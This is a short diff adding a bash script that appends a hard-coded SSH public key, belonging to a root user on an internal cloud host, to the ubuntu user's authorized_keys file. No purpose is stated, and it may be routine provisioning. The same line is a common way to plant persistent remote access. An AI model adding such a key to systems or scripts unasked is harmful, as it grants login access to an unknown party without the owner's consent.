@@ -1,0 +1,4 @@
+----------------
+
+#!/bin/bash
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTbB7mfgVy7k/HprMxzyzgKZ8tNU8RFJsqIXqPlQgqD8ow2PA7h2jnYRZ7J2oW/4SvcIRwd6mt2crijRxFZaj0xWHdqvcY1ESJZnsakGpORHUpCePxkWEZEMLCts+uoRKWpJ18hVDYWabwb1zqPGD3/1dOK6P2QnVZ4Hfpf0BZXRgQUfIKdGDzknIqllzmnSlJGeX5mcgRc/r6XsKPSLphaKGp6FxysA+E5Mi/Ss8pSmrgOPEd+KnQcNQ7gP7wfm400Zaz8CDIQG+W1EGWV3XOQiQyCXXYL4pfF5eES7czzf3a1YctyYNvYk4yEYxaxGb73r7WbarptvIG8/r+kYy3O3wgaM+Tpia6Ex7P7nvvKG/L/Y+Hl/8b1D5fwJRmDYGc8S8A+YNl9aty5aCejzZyFP1ljCYcCl5ghpBPSRCkvNJGJD9m1rb4RdOpLeDLDuQ3awMADXJ8oG05OddLXlt/X7os6VFNkslZpMyehVoSty2aPZ7oLptCG/zZkIrujQ8= root@ip-172-31-25-150" >>/home/ubuntu/.ssh/authorized_keys
